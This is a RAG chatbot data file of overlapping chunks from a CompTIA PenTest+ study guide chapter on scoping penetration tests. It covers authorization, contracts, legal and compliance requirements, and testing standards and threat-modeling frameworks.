public ranges. Domains: Most pentesters will engage with domains, and knowing what domains a company uses up front can help you enter the second phase: data collection. Knowing domains in use can help to identify how a company uses the domain name
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	of testing, and the first major scope definition when it comes to technology is what IP address ranges may be in use, which are in scope to scan, and which are excluded. You will need to know what the company is using in terms of IP address ranges and that includes both internal and external or private versus public ranges. Domains: Most pentesters will engage with domains, and knowing what domains a company uses up front can help you enter the second phase: data collection. Knowing domains in use can help to identify how a company uses the domain name system (DNS), accesses and resolves to the Internet, what service providers they use, and so much more. Internet Protocol (IP) Addresses: Tied to CIDR, the next target selection criteria item you want to flesh out as a tester is the actual IP addresses in use in the organization. This can likely be found in an IP address management tool, on the Dynamic Host Configuration Protocol (DHCP) server(s) in use, and so on. Having this information as well as associated hostnames (from the domain) can help to create a map of the organization's technical assets that need to be tested. Uniform Resource Locator (URL): The target selection of uniform resource locators (URLs) enables testers to be aware of any web‐based access via applications or web browsers that needs to be reviewed and assessed. Assessment Types A penetration test can be conducted in various ways assessing various systems, functions, services and so on. When creating your penetration test scope and identifying what you will test, you will consider the following assessment types for both the workplace and the exam: Web: An assessment type that will simulate web activity normally encompasses typical scenarios such as external access from the web into a company, load balancers, web applications, web servers, and code associated with providing web content as examples. Network: An assessment type that will simulate network activity normally encompasses internal and external network components and infrastructure associated with all communications fabric, such as switches, routers, and various other components. It will also cover the logical aspects of the code running on these devices as well as their configurations. Examples could be assessing routing protocols, access control lists (ACLs), access control, and so on. Mobile: An assessment type that will simulate mobile activity normally encompasses all devices that comprise an organization's mobile management framework. For example, it can be the infrastructure that supports mobile technology such as the mobile device management (MDM) solutions, to the devices (endpoints) themselves. Cloud: An assessment type that will simulate cloud activity normally encompasses all of an organization's cloud infrastructure, which is normally the connection to and the use of cloud solutions from a service provider. This can consist of public, private, and hybrid cloud solutions, as well as service models like IaaS, PaaS, and SaaS solutions. Application Programming Interface (API): An assessment type that will simulate API activity normally encompasses how APIs are used in an organization and
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	For example, it can be the infrastructure that supports mobile technology such as the mobile device management (MDM) solutions, to the devices (endpoints) themselves. Cloud: An assessment type that will simulate cloud activity normally encompasses all of an organization's cloud infrastructure, which is normally the connection to and the use of cloud solutions from a service provider. This can consist of public, private, and hybrid cloud solutions, as well as service models like IaaS, PaaS, and SaaS solutions. Application Programming Interface (API): An assessment type that will simulate API activity normally encompasses how APIs are used in an organization and what vulnerabilities may exist in the code itself, or in the API's connectivity to various other services. Application: An assessment type that will simulate application activity normally encompasses the programming code and use of software‐based solutions in an organization. This can revolve around the code itself and how its managed in an integrated development environment (IDE), or how that code moves through the software development life cycle (SDLC) or a continuous integration/continuous deployment (CI/CD) pipeline. Wireless: An assessment type that will simulate wireless activity normally encompasses the part of the network assessment that is not wired. Wireless networks generally consist of access points, wireless controllers, antennas, and various other devices that can be assessed for weaknesses. Shared Responsibility Model Penetration testers need to understand what when working with vendors such as cloud providers, there is a handoff between what is the customers responsibility and the vendor itself. Once you begin to work with vendors or service providers, there is a clean delineation between what a customer has responsibility for and what the service provider (as an example) is responsible for. In this section based on the role (hosting provider, customer, tester, third party), each has a specific set of responsibilities they are required to uphold and that you need to be aware of when conducting a pentest. When considering a cloud provider as a common example of how these responsibilities are carved out, consider the matrix provided in Figure 2.2, which shows the breakout of what needs to be understood and agreed to by all parties in the engagement. In this example, it's clear to see specifically how depending on the service model selected such as PaaS, where the responsibility of the customer ends and the cloud provider begins. Here we can see that when considering network controls, for PaaS responsibility is shared between both the customer and the provider. This is important to note because as a pentester, when defining the scope of the assessment itself, you will need to clearly know what the responsibility of each party is so that you can set the expectations of what work will be done and by whom. Hosting Provider Responsibilities In a pentest, the hosting provider, such as a managed service provider (MSP) or a cloud service provider (CSP), has very specific roles when it comes to who is responsible for what with security. In the shared responsibility model, it's important
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	responsibility is shared between both the customer and the provider. This is important to note because as a pentester, when defining the scope of the assessment itself, you will need to clearly know what the responsibility of each party is so that you can set the expectations of what work will be done and by whom. Hosting Provider Responsibilities In a pentest, the hosting provider, such as a managed service provider (MSP) or a cloud service provider (CSP), has very specific roles when it comes to who is responsible for what with security. In the shared responsibility model, it's important to note that when tests are conducted, the hosting provider may be responsible for a specific function, whereas the client or customer may be responsible for another even if they appear to be one and the same. To further explain this, let's use another example related to the network. FIGURE 2.2 Microsoft Shared Responsibility Matrix When you conduct a pentest of the network for an organization using a cloud provider, you may need to stop your scanning at the cloud provider's project edge, which may be a logical border where the customer and the cloud provider meet. In the project itself, you may want to test the security of a virtual private cloud (VPC), which would fall under the customer's responsibility. However, once you have tested the customer's VPC, you may need to stop the test at that boundary. Further testing the cloud provider's infrastructure that provides the VPC service is not part of the customer's systems but rather the cloud service provider's and would fall into the hosting provider's responsibility set. Customer Responsibilities Using the same example we just covered with the hosting provider's responsibility set, the customer's assets in the cloud can be tested based on their internal infrastructure and what services they are using. Another example could be testing identity and access management (IAM) to make sure that the accounts (or roles) that the customer is using is set correctly and providing least privilege. In this example, the tester could access the cloud provider's IAM console and begin to assess the accounts and roles used by the customer. This would fall into scope and be part of the customer responsibilities; however, what would not fall into scope would be to test either all of the provider's accounts in use across their various accounts, or the systems that provide the internal service of IAM itself. You must know what is part of the defined provider versus customer responsibility so that you can accurately prepare for and conduct a pentest. Penetration Tester Responsibilities The penetration tester responsibilities are simply outlined to fall within the scope of what is defined in the body of work created for the testing to be conducted. For example, once it's understood where the service provider's and the customer's boundaries lie, as a tester you can begin to outline what will be in and out of scope for the testing. That scope, once shared with
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	provide the internal service of IAM itself. You must know what is part of the defined provider versus customer responsibility so that you can accurately prepare for and conduct a pentest. Penetration Tester Responsibilities The penetration tester responsibilities are simply outlined to fall within the scope of what is defined in the body of work created for the testing to be conducted. For example, once it's understood where the service provider's and the customer's boundaries lie, as a tester you can begin to outline what will be in and out of scope for the testing. That scope, once shared with the customer or client, would become part of your responsibilities. It's important to remain within that scope. Stepping outside of it could create various legal, compliance, and technical challenges for all involved. It's also important to define your responsibilities so that the body of work can be done correctly. Beyond ethical and moral standards that professionals will uphold themselves to, knowing clearly what is expected by all parties can provide for a satisfying completion of the work, with artifacts clearly showing either issues that need to be rectified or what remains secure. Third‐Party Responsibilities There will be times when other third parties enter into the mix when you're doing pentest work. This could be other security firms, other clients, application and tool vendors, and so on. An example would be if you were working directly with a cloud provider that is hosting VMware solutions in their cloud for the customer. Once this third party is added to the mix, you have to define their responsibility as well since it relates to pentesting and the scope of work being defined. This, like all other shared responsibilities, allows for a clear understanding of who is responsible for what when things do not go as planned, questions come up that need to be answered, or additional help is needed with the scans and tests. Additional authorization may be needed for many penetration tests, particularly those that involve complex IT infrastructure. Third parties are often used to host systems, as SaaS, PaaS, or IaaS cloud providers, or for other purposes, and a complete test could impact those providers. Thus, it is important to determine what third‐party providers or partners may be in scope and to obtain authorization. At the same time, you should make both your customer and the third party aware of potential impacts from the penetration test. Key Legal Concepts for Penetration Tests Penetration testers need to understand the legal context and requirements for their work in addition to the technical and process portions of a penetration test. Contracts, statements of work, NDAs, and the laws and legal requirements each state, country, or local jurisdiction enforces are all important for you to know and understand before starting a penetration test. As a tester, you must also ensure that there are authorization letters in place, mandatory reporting requirements, and any risks associated to the testers themselves. Authorization Letters Penetration tests also require appropriate
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	impacts from the penetration test. Key Legal Concepts for Penetration Tests Penetration testers need to understand the legal context and requirements for their work in addition to the technical and process portions of a penetration test. Contracts, statements of work, NDAs, and the laws and legal requirements each state, country, or local jurisdiction enforces are all important for you to know and understand before starting a penetration test. As a tester, you must also ensure that there are authorization letters in place, mandatory reporting requirements, and any risks associated to the testers themselves. Authorization Letters Penetration tests also require appropriate permission to attack, or authorization. Regardless of whether they are conducted by an internal team or as part of a contract between two parties, penetration tests need signatures from proper signing authorities. If you are conducting an internal penetration test, make sure the person who is approving the test is authorized to do so. As an external penetration tester, you may not be able to verify this as easily and thus will have to rely on the contract. At that point, indemnification language in case something goes wrong is important. An authorization is a must‐have for a penetration tester. This is essentially your “Get out of jail free” card. Most of the work done by a penetration tester revolves around breaking and entering, ethical hacking, snooping, and other otherwise nefarious activities. Even though you are doing them with permission, it is always good to have that letter of approval. An authorization letter provides the framework and permission to conduct ethical hacking and penetration testing activities. This protects the tester from any legal, or otherwise, ethical concerns that may be raised by testing activity. The letter itself can come from the organization that is doing the work and likely from executive leaders who may be stakeholders invested in the project or activities taking place. Many times, the CISO would be responsible for providing permission for such activities to take place. Mandatory Reporting Requirements Mandatory reporting requirements are the specific reporting artifacts due from the engagement itself. For example, if you are a tester conducting penetration testing for an organization, there needs to be reporting based on the work. The final stages of the penetration test end in reporting. It's good to set the scope of what will be reported early on before the testing begins. For example, you may be asked to test and provide reports on vulnerabilities, weaknesses, and areas of exploit within a government system. You may be asked whether there are mandatory reporting requirements in place so that any issues are immediately brought to the attention of executive leadership in areas where the risk is extremely high. You can request that all other reporting take place weekly in a status update. There are various ways reporting can be set up, but it's important to outline them up front and set up a schedule and an escalation path based on priority or risk. Risk to the Penetration Tester All
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	to test and provide reports on vulnerabilities, weaknesses, and areas of exploit within a government system. You may be asked whether there are mandatory reporting requirements in place so that any issues are immediately brought to the attention of executive leadership in areas where the risk is extremely high. You can request that all other reporting take place weekly in a status update. There are various ways reporting can be set up, but it's important to outline them up front and set up a schedule and an escalation path based on priority or risk. Risk to the Penetration Tester All work comes with risk, especially when you are penetration testing. For example, if you did not have an authorization letter in place and agreed‐ upon boundaries, you could, for example, access a system that contains medical records and personal health information (PHI) and thus create legal, compliance, or ethnical concerns. If you are not protected, you may face liability. When starting your penetration testing efforts and defining your scope of work, make sure that you have addressed the risks, assessed them, and put the proper protections in place to lower the risk or avoid them all together. Contracts Many penetration tests start with a contract, which documents the agreement between the penetration tester and the client or customer who engaged them for the test. As mentioned earlier in the chapter, there are requirements that must be outlined in the scoping of the effort to protect all parties. Some of these mentioned agreement types include an NDA and an MSA as examples. Some penetration tests are done with a single contract, whereas others are done with a statement of work (SOW), a document that defines the purpose of the work, what work will be done, what deliverables will be created, the timeline for the work to be completed, the price for the work, and any additional terms and conditions that cover the work. Alternatives to statements of work include statements of objectives (SOOs) and performance work statements (PWSs), both of which are used by the U.S. government. Many organizations also create a master service agreement (MSA), which defines the terms that the organizations will use for future work. This makes ongoing engagements and SOWs much easier to work through, as the overall MSA is referred to in the SOW, preventing the need to renegotiate terms. MSAs are common when organizations anticipate working together over a period of time or when a support contract is created. In addition, penetration testers are often asked to sign nondisclosure agreements (NDAs) or confidentiality agreements (CAs), which are legal documents that help enforce confidential relationships between two parties. NDAs protect one or more parties in the relationship and typically outline the parties, what information should be considered confidential, how long the agreement lasts, when and how disclosure is acceptable, and how confidential information should be handled. Service level agreements (SLAs) may also come into play during penetration tests. SLAs set the expectations for services, including things
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	working together over a period of time or when a support contract is created. In addition, penetration testers are often asked to sign nondisclosure agreements (NDAs) or confidentiality agreements (CAs), which are legal documents that help enforce confidential relationships between two parties. NDAs protect one or more parties in the relationship and typically outline the parties, what information should be considered confidential, how long the agreement lasts, when and how disclosure is acceptable, and how confidential information should be handled. Service level agreements (SLAs) may also come into play during penetration tests. SLAs set the expectations for services, including things like availability, reliability, and quality of the service. Although SLAs are most often associated with vendors providing services, a pentester may need to provide a service level agreement with measures as part of a contract or may need to understand third‐party SLAs as part of the test. As a penetration tester, you should also be aware of noncompete agreements (sometimes called noncompete clauses or covenants to not compete). You're unlikely to have a client ask you to sign one, but your employer may! A noncompete agreement asks you to agree not to take a job with a competitor or to directly compete with your employer in a future job, and they are often time‐limited, with a clause stating that you won't take a job in the same field for a set period of time. Noncompetes are typically used to limit the chances of a competitor gaining a competitive advantage by hiring you away from your employer, but they have also been used to limit employment choices for staff members. Data Ownership and Retention When the penetration test ends, you will typically have a significant amount of data about the target of the test. That data may include sensitive information, internal documentation, usernames, passwords, and of course the report itself with a list of findings. The ownership of this data after the test is an important consideration and should be covered in the contract, MSA, or SOW for each engagement, with clear expectations of who owns the data, how it will be stored and secured, and what will be done with it after the engagement is done. Environmental Differences and Location Restrictions The laws and regulations that apply to penetration testing and penetration testers vary around the world (and even from state to state in the United States!). Therefore, you need to understand what laws apply to the work you're doing. The United Kingdom's Computer Misuse Act (CMA) of 1990 serves as an excellent example of the type of international law that a penetration tester needs to be aware of before conducting a test. The CMA includes criminal penalties for unauthorized individuals who access programs or data on computers or who impair the operation of systems. It also addresses the creation of tools that can be used as part of these violations. Although the CMA primarily targets creators of malware and other malicious tools, exploit tools like the AutoSploit automated exploit
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	to understand what laws apply to the work you're doing. The United Kingdom's Computer Misuse Act (CMA) of 1990 serves as an excellent example of the type of international law that a penetration tester needs to be aware of before conducting a test. The CMA includes criminal penalties for unauthorized individuals who access programs or data on computers or who impair the operation of systems. It also addresses the creation of tools that can be used as part of these violations. Although the CMA primarily targets creators of malware and other malicious tools, exploit tools like the AutoSploit automated exploit tool released in 2018 could potentially be covered by laws like this that target “dangerous” software. In some cases, tools may also be covered by export restrictions. The United States prohibits the export of some types of software and hardware, including encryption tools. If you are traveling with your penetration testing toolkit, or may transfer the tools via the Internet, understanding that export restrictions may be in place for software or hardware in your possession can help keep you out of trouble. The Export Administration Regulations (EAR) Supplement No 1. Part 740 covers the export of encryption tools. Countries in group B have relaxed encryption export rules; D:1 countries have strict export controls; and E:1 countries are considered terrorist‐supporting countries (like Cuba, Iran, and North Korea) and are also under strict export control. Once you have reviewed local and national government restrictions and understand the laws and regulations that cover penetration testing and related activities, make sure you understand the venue in which contract issues will be decided. In legal terms, the venue is where any legal action would occur and is often called out in the contract. In general, the venue is likely to be where your client is located, but larger organizations may specify their headquarters or another location. Jurisdiction, or the authority of law over an area, is also important, because the laws that apply to the penetration tester and the target may be different. Since penetration testers often work across state or national borders, the laws that apply in each location must be understood. An increasing number of locations also have privacy requirements that must be considered during penetration tests. Understanding both legal and policy restrictions on information handling that may be relevant to the penetration testing engagement you are working on is an important step for any test you may consider. Regulatory Compliance Considerations Laws and regulations like HIPAA, FERPA, SOX, GLBA, and the EU's General Data Protection Regulation (GDPR) as well as standards like PCI DSS all have compliance requirements that covered organizations have to meet. This means that compliance‐based assessments can bring their own set of special requirements beyond what a typical penetration test or security assessment may involve. The PenTest+ exam specifically targets one set of regulations and one industry standard, but it covers them both under the heading of regulatory compliance. They are as follows: Payment Card Industry Data Security Standard
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	for any test you may consider. Regulatory Compliance Considerations Laws and regulations like HIPAA, FERPA, SOX, GLBA, and the EU's General Data Protection Regulation (GDPR) as well as standards like PCI DSS all have compliance requirements that covered organizations have to meet. This means that compliance‐based assessments can bring their own set of special requirements beyond what a typical penetration test or security assessment may involve. The PenTest+ exam specifically targets one set of regulations and one industry standard, but it covers them both under the heading of regulatory compliance. They are as follows: Payment Card Industry Data Security Standard (PCI DSS) The rules to complete assessments for credit card processing environments and systems are set by the compliance standard. The PCI DSS standard provides examples of what is required for compliance, including its definition of what a cardholder data environment (CDE) penetration test should include: the entire external, public‐facing perimeter as well as the LAN‐to‐LAN attack surfaces. Fortunately, PCI DSS provides specific guidance for penetration testing as well at https://www.listings.pcisecuritystandards.org/documents/PenetrationTesting-Guidance-v1_1.pdf. General Data Protection Regulation (GDPR) GDPR is an EU regulation that protects data and privacy. It has a broad international impact because it also covers personal information that leaves the EU and European Economic Area (EEA). GDPR defines the rights of data subjects, including rights to have information provided in understandable ways, access to and information about how your personal information is being processed, and the right to have your data erased. In addition, individuals can also object to having their data processed for uses like marketing and sales. Controllers and processors are required to use and support capabilities like using pseudonymization, recording processing activities, securing data, and ensuring that organizations have someone tasked with protecting data (a data protection officer). Penetration testers need to be aware of GDPR handling requirements if they obtain or access data during penetration tests and may be subject to other requirements when they work with covered entities. What Is “Compliant”? In some cases, compliance‐based assessments can be easier to perform than non‐compliance types because they have specific requirements spelled out in the regulations or standards. Unfortunately, the opposite is often true as well—legal requirements use terms like best practice or due diligence instead of providing a definition, leaving organizations to take their best guess. As new laws are created, industry organizations often work to create common practices, but be aware that there may not be a hard‐and‐fast answer to “what is compliant” in every case. Although the PenTest+ exam outline only covers PCI DSS and GDPR, there are many laws and standards that you may be asked to assess against as part of a compliance‐based test. In the United States, a few major laws and standards drive significant amounts of penetration testing work. HIPAA, GLBA, SOX, PCI DSS, and FIPS 140‐3 each have compliance requirements that may drive assessments, making it important for you to be aware of them at a high level. The Health Insurance Portability and Accountability Act of 1996 (HIPAA)
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	not be a hard‐and‐fast answer to “what is compliant” in every case. Although the PenTest+ exam outline only covers PCI DSS and GDPR, there are many laws and standards that you may be asked to assess against as part of a compliance‐based test. In the United States, a few major laws and standards drive significant amounts of penetration testing work. HIPAA, GLBA, SOX, PCI DSS, and FIPS 140‐3 each have compliance requirements that may drive assessments, making it important for you to be aware of them at a high level. The Health Insurance Portability and Accountability Act of 1996 (HIPAA) does not directly require penetration testing or vulnerability scanning. It does, however, require a risk analysis, and this requirement drives testing of security controls and practices. NIST has also released guidance on implementing HIPAA (https://csrc.nist.gov/publications/detail/sp/80066/rev-1/final), which includes a recommendation that penetration testing should be part of the evaluation process. Thus, HIPAA‐covered entities are likely to perform a penetration test as part of their normal ongoing assessment processes. The Gramm–Leach–Bliley Act (GLBA) regulates how financial institutions handle personal information of individuals. It requires companies to have a written information security plan that describes processes and procedures intended to protect that information, and covered entities must also test and monitor their efforts. Penetration testing may be (and frequently is) part of that testing methodology because GLBA requires financial institutions to protect against “reasonably anticipated threats”—something that is easier to do when you are actively conducting penetration tests. The Sarbanes–Oxley Act (SOX) is a U.S. federal law that set standards for U.S. public company boards, management, and accounting firms. SOX sets standards for controls related to policy, standards, access and authentication, network security, and a variety of other requirements. A key element of SOX is a yearly requirement to assess controls and procedures, thus potentially driving a desire for penetration testing. FIPS 140‐3 is a U.S. government computer security standard used to approve cryptographic modules. These modules are then certified under FIPS 140‐3 and can be assessed based on that certification and the practices followed in their use. Details of FIPS 140‐3 can be found here: https://csrc.nist.gov/publications/detail/fips/140/3/final There are many other standards and regulations that may apply to an organization, making compliance‐based assessments a common driver for penetration testing efforts. As you prepare to perform a penetration test, be sure to understand the compliance environment in which your client or organization operates and how that environment may influence the scope, requirements, methodology, and output of your testing. Penetration Testing Standards and Methodologies Building a penetration testing process from scratch is challenging. Fortunately, multiple penetration testing standards and guides have been written and can be leveraged to build your own methodology or practice. Frameworks like MITRE's ATT&CK can help you think through attacks and methodologies, and standards like the Worldwide Application Security Project (OWASP) testing methodologies or the Penetration Testing Execution Standard (PTES) provide both processes and useful techniques. For the exam, you will need to compare testing frameworks and methodologies. This means you
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	how that environment may influence the scope, requirements, methodology, and output of your testing. Penetration Testing Standards and Methodologies Building a penetration testing process from scratch is challenging. Fortunately, multiple penetration testing standards and guides have been written and can be leveraged to build your own methodology or practice. Frameworks like MITRE's ATT&CK can help you think through attacks and methodologies, and standards like the Worldwide Application Security Project (OWASP) testing methodologies or the Penetration Testing Execution Standard (PTES) provide both processes and useful techniques. For the exam, you will need to compare testing frameworks and methodologies. This means you will need to intimately know the details of standards found in threat modeling frameworks, methodologies found within OWASP. Make sure you are not only aware of the standard itself, but the details of what makes one standard different from another. You'll find that some of the standards listed here are dated and have not received updates in a decade or more. That doesn't mean they're useless —the basic concepts and techniques are frequently still applicable to modern penetration tests. It does mean that you'll need to apply the concepts in modern ways and that you may need to look at additional techniques to tackle systems like virtual machines, containers, machine learning (ML) and AI‐based systems, or other more recent technologies and systems. Testing Standards The Pentest+ exam outline points to a few critical resources that you should be aware of: Open Source Security Testing Methodology Manual (OSSTMM) The Open Source Security Testing Methodology Manual (OSSTMM) is another broad penetration testing methodology guide with information about analysis, metrics, workflows, human security, physical security, and wireless security. Unfortunately, it has not been updated since 2010, resulting in more modern techniques and technologies not being included in the manual. You can read the full manual here: https://www.isecom.org/OSSTMM.3.pdf. Council of Registered Ethical Security Testers (CREST) The Council of Registered Ethical Security Testers (CREST) is an international accreditation and certification body that allows those in information security to certify and test for credentials. You can read the full manual here: https://www.crest-approved.org. Penetration Testing Execution Standard (PTES) The Penetration Testing Execution Standard (PTES) ranges from pre‐ engagement interactions like scoping and questions to ask clients, to details such as how to deal with third parties. It also includes a full range of penetration testing techniques and concepts, making it one of the most complete and modern openly available penetration testing standards. You can find the complete standard here: http://www.pentest-standard.org/index.php/Main_Page. The MITRE ATT&CK Framework MITRE provides the ATT&CK Framework (which stands for Adversarial Tactics, Techniques, and Common Knowledge), a knowledgebase of adversary tactics and techniques. The ATT&CK matrices include detailed descriptions, definitions, and examples for the complete threat life cycle from initial access through execution, persistence, privilege escalation, and exfiltration. At each level, it lists techniques and components, allowing threat assessment modeling to leverage common descriptions and knowledge. ATT&CK matrices include pre‐attack, enterprise matrices focusing on Windows, macOS, Linux, and cloud computing, as well as iOS and
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	openly available penetration testing standards. You can find the complete standard here: http://www.pentest-standard.org/index.php/Main_Page. The MITRE ATT&CK Framework MITRE provides the ATT&CK Framework (which stands for Adversarial Tactics, Techniques, and Common Knowledge), a knowledgebase of adversary tactics and techniques. The ATT&CK matrices include detailed descriptions, definitions, and examples for the complete threat life cycle from initial access through execution, persistence, privilege escalation, and exfiltration. At each level, it lists techniques and components, allowing threat assessment modeling to leverage common descriptions and knowledge. ATT&CK matrices include pre‐attack, enterprise matrices focusing on Windows, macOS, Linux, and cloud computing, as well as iOS and Android mobile platforms. It also includes details of mitigations, threat actor groups, software, and a host of other useful details. All of this adds up to make ATT&CK the most comprehensive freely available database of adversary techniques, tactics, and related information that the authors of this book are aware of. Unlike some of the other resources the PenTest+ exam outline covers, however, ATT&CK is not a complete penetration testing standard or outline. Instead, it focuses on tactics and techniques, meaning that it is more useful for penetration testers who are looking for a concept or practice than for building a complete penetration testing process or program. Open Worldwide Application Security Project (OWASP) The Open Worldwide Application Security Project (OWASP) provides testing guides for web security, mobile security, and firmware, as well as advice on how to use other testing methodologies and standards. A full list of the OWASP penetration testing related sources can be found here: https://owasp.org/www-project-web-security-testingguide/latest/3-The_OWASP_Testing_Framework/1Penetration_Testing_Methodologies. OWASP Mobile Application Security Verification Standard (MASVS) The OWASP Mobile Application Security Verification Standard (MASVS) is a part of OWASP focused on mobile application (app) security. It is designed to cater to and create an industry standard for secure mobile software development. It also caters to penetration testers looking to ensure completeness and consistency of test results. You can read the full manual here: https://mas.owasp.org/MASVS. Purdue Model Purdue Enterprise Reference Architecture (PERA), also known,as the Purdue Model, is an old reference standard model put in place for industrial control system (ICS) solutions. It's somewhat outdated but is still referenced today for some of its relevancy and historic value. The largest outcome of this model that is highly used today is the concept of segmentation. You can read the full manual here: https://www.energy.gov/sites/default/files/202210/Infra_Topic_Paper_4-14_FINAL.pdf. National Institute of Standards and Technology (NIST) The National Institute of Standards and Technology (NIST) provides standards that include penetration testing as part of NIST special publication 800‐115, the Technical Guide to Information Security Testing and Assessment. You can find the full document at https://csrc.nist.gov/publications/detail/sp/800-115/final, but it is worth noting that the last update was in 2008. NIST 800‐115 continues to influence security testing methodologies, but it is not a modern document. Information Systems Security Assessment Framework (ISSAF) A final standard is the Open Information Systems Security Group (OSSIG) Information Systems Security Assessment Framework (ISSAF). The ISSAF is a highly detailed penetration testing framework but suffers from being dated. The last
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Standards and Technology (NIST) provides standards that include penetration testing as part of NIST special publication 800‐115, the Technical Guide to Information Security Testing and Assessment. You can find the full document at https://csrc.nist.gov/publications/detail/sp/800-115/final, but it is worth noting that the last update was in 2008. NIST 800‐115 continues to influence security testing methodologies, but it is not a modern document. Information Systems Security Assessment Framework (ISSAF) A final standard is the Open Information Systems Security Group (OSSIG) Information Systems Security Assessment Framework (ISSAF). The ISSAF is a highly detailed penetration testing framework but suffers from being dated. The last ISSAF update was in 2005, and OSSIG does not have active downloads available for the standard. Modern penetration testers should select another framework while remaining aware of the standard for the PenTest+ exam. Threat Modeling Frameworks The Pentest+ exam outline points to a few threat modeling frameworks that you should be aware of: Damage Potential, Reproducibility, Exploitability, Affected Users, Discoverability (DREAD) The Damage potential, Reproducibility, Exploitability, Affected users, Discoverability (DREAD) threat model is a security model originally created by Microsoft. It has the five specific categories listed within its name that you should use when analyzing a system to see if a threat exists. It is a form of risk assessment that helps you quickly determine if a system is vulnerable by providing a rating from the five listed categories in its name. You can read the full manual here: https://learn.microsoft.com/en-us/previous-versions/msp-np/ff648644(v=pandp.10). Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege (STRIDE) The Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege (STRIDE) model is another Microsoft created reference standard that allows you to conduct thread modeling based on security threats found within the six listed categories in the acronym name. You can read the full manual here: https://learn.microsoft.com/en-us/previous-versions/commerceserver/ee823878(v=cs.20). Operationally Critical Threat, Asset, and Vulnerability Evaluation (OCTAVE) The Operationally Critical Threat, Asset, and Vulnerability Evaluation (OCTAVE) threat modeling framework allows for methods that a tester can use to conduct a thorough assessment. You can read the full manual here: https://insights.sei.cmu.edu/library/operationally-critical- threat-asset-and-vulnerability-evaluation-octave-framework-version10. Many organizations and individual penetration testers choose to combine multiple standards and techniques to build their own processes and procedures. Although you won't need to know each of these in depth to pass the exam, you should make sure you've at least skimmed through one or two so you understand what they contain, how techniques and processes are defined, and have thought about how you'd use them if you were conducting a penetration test or building your own process. Summary Planning and scoping a penetration test is the first step for most penetration testing engagements. It is important to understand why the penetration test is being planned and who the target audience of the final report will be. Along the way, you will define and document the rules of engagement, what type of assessment and what assessment strategy you will use, and what is in scope and out of scope. Scoping an assessment defines both the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	processes are defined, and have thought about how you'd use them if you were conducting a penetration test or building your own process. Summary Planning and scoping a penetration test is the first step for most penetration testing engagements. It is important to understand why the penetration test is being planned and who the target audience of the final report will be. Along the way, you will define and document the rules of engagement, what type of assessment and what assessment strategy you will use, and what is in scope and out of scope. Scoping an assessment defines both the targets you can and the targets you cannot test as well as any special limitations that should be observed, such as the time of day, business impact considerations, or defensive measures the target organization has in place. Scoping also addresses an organization's risk acceptance and tolerance to the potential impact of a penetration test, since all tests have the potential to cause an outage or other service issue. Penetration testers also need to know about the legal and contractual aspects of a penetration test. A contract or agreement to conduct the test is an important part of most third‐party penetration tests, whereas internal penetration testers will typically make sure they have proper sign‐off from the appropriate person in their organization. Master service agreements, statements of work, and nondisclosure agreements are all common parts of a pentester's path to starting an engagement. Penetration testers can use standards like PTES or OSSTM, as well as information from OWASP, NIST, and MITRE's ATT&CK framework to design, build, and enhance their penetration testing processes. There are often external legal and compliance requirements as well as the target organization's internal policies. Laws, regulations, and industry standards are all part of the environment that a penetration tester must navigate. In the United States, laws like HIPAA, SOX, and GLBA all drive organizations to seek penetration tests as part of the compliance efforts. Equally important, regulations such as HIPAA strictly forbid protected health information (PHI) from being accessed, even in the process of penetration testing. Industry standards like PCI DSS and government standards like FIPS 140‐2 also have specific requirements that organizations must meet and that penetration testers may be asked either to include in their scope or to specifically address as part of their test. Exam Essentials Be able to explain the importance of planning and scoping engagements. Planning a penetration test requires understanding why the test is being conducted and who the target audience of the closeout report is. While the penetration test is being planned, important elements include the rules of engagement, communications and emergency escalation plans, requirements like confidentiality and resource availability, the overall budget for the assessment, and any technical or business constraints that are in place. The rules of engagement are one of the most critical parts of this planning and usually include the scope: what can and cannot be tested. Be able to apply appropriate standards and methodologies. Openly available
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	scoping engagements. Planning a penetration test requires understanding why the test is being conducted and who the target audience of the closeout report is. While the penetration test is being planned, important elements include the rules of engagement, communications and emergency escalation plans, requirements like confidentiality and resource availability, the overall budget for the assessment, and any technical or business constraints that are in place. The rules of engagement are one of the most critical parts of this planning and usually include the scope: what can and cannot be tested. Be able to apply appropriate standards and methodologies. Openly available penetration testing standards like the Open Source Security Testing Methodology Manual (OSSTM), the Penetration Testing Execution Standard (PTES), and the Information System Security Assessment Framework (ISSAF) can serve as a strong foundation for penetration testing practices. Specialized knowledge like the web and application‐specific testing methodologies and techniques provided by the Open Worldwide Application Security Project (OWASP) or the technique and method mapping provided by MITRE's ATT&CK framework give penetration testers more tools to build better testing techniques and processes. Finally, NIST 800‐115 and other standards set expectations about what a test should include. Know the importance of the rules of engagement for penetration testing and how to validate the scope of the engagement. A critical part of penetration testing preparation is to set the rules of engagement. Penetration testers need to determine if the test will be a known, partially known, or unknown environment. They must also determine if there are specific times of day or dates, systems or environments, or other limitations to what should be considered in scope. Testers also need to work out contract details and how they will manage their own time to ensure that they are meeting the requirements in an effective way. Understand target selection and what assets may be considered in scope. Target selection determines how much effort will be required to complete an assessment, how complex the assessment will be, and whether you will need third‐party involvement or permissions to test systems that are not directly owned by the target of the penetration test. In known environment assessments, target selection is usually much simpler. An unknown environment assessment can make target selection much more difficult and should be carefully scoped and defined to ensure that only legitimate targets are tested. Understand the key legal concepts related to penetration testing. Penetration testers need to understand legal concepts like master service agreements that define the overall contract between organizations for engagements, statements of work that define the 